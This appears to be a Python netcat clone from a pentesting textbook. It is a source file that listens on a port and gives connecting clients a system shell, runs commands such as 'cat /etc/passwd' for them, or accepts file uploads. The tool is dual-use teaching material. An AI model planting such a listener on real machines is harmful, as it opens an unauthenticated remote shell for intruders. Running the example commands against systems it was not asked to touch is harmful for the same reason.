import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading

def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return None
    output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
    return output.decode()


class NetCat:
    def __init__(self, arguments, buff=None):
        self.args = arguments
        self.buffer = buff
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def run(self):
        if self.args.listen:
            self.listen()
        else:
            self.send()

    def listen(self):
        print(f"Listening on {self.args.target}:{self.args.port}")
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)
        while True:
            client_socket, client = self.socket.accept()
            print(f"Connection from {client[0]}:{client[1]}")
            client_thread = threading.Thread(target=self.handle, args=(client_socket,))
            client_thread.start()

    def send(self):
        self.socket.connect((self.args.target, self.args.port))
        if self.buffer:
            self.socket.send(self.buffer)
        try:
            while True:
                recv_len = 1
                resp = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    resp += data.decode()
                    if recv_len < 4096:
                        break
                if resp:
                    print(resp)
                    buff = input('> ')
                    buff += '\n'
                    self.socket.send(buff.encode())
        except KeyboardInterrupt:
            print('Operation terminated by user')
            self.socket.close()
            sys.exit()

    def handle(self, client_socket):
        if self.args.execute:
            output = execute(self.args.execute)
            client_socket.send(output.encode())

        elif self.args.upload:
            file_buffer = b''
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break
            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
            msg = f"File {self.args.upload} saved"
            client_socket.send(msg.encode())

        elif self.args.command:
            cmd_buffer = b''
            while True:
                try:
                    client_socket.send(b' #> ')
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    resp = execute(cmd_buffer.decode())
                    if resp:
                        client_socket.send(resp.encode())
                    cmd_buffer = b''
                except Exception as e:
                    print(f"Server stopped: {e}")
                    self.socket.close()
                    sys.exit()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description = "PyNetcat based on BHP by Seitz&Arnold",
        formatter_class = argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''Examples:
        netcat.py -t 192.168.1.1 -p 1337 -l -c                      #System shell
        netcat.py -t 192.168.1.1 -p 1337 -l -u=test.txt             #Load a file
        netcat.py -t 192.168.1.1 -p 1337 -l -e=\"cat /etc/passwd\"  #Command execution
        echo 'ABC' | ./netcat.py -t 192.168.1.1 -p 1337             #Send text on the port
        netcat.py -t 192.168.1.1 -p 1337 -l -p 1337                 #Connect with the port
        ''')
    )
    parser.add_argument('-c', '--command', action='store_true', help="Open shell")
    parser.add_argument('-e', '--execute', help="Run shell command")
    parser.add_argument('-l', '--listen', action='store_true', help="Listening")
    parser.add_argument('-p', '--port', type=int, default=1337, help="Target TCP port")
    parser.add_argument('-t', '--target', default='127.0.0.1', help="Target IP address")
    parser.add_argument('-u', '--upload', help="Load a file")
    args = parser.parse_args()
    if args.listen:
        buffer = ''
    else:
        buffer = sys.stdin.read()

    nc = NetCat(args, buffer.encode('utf-8'))
    nc.run()
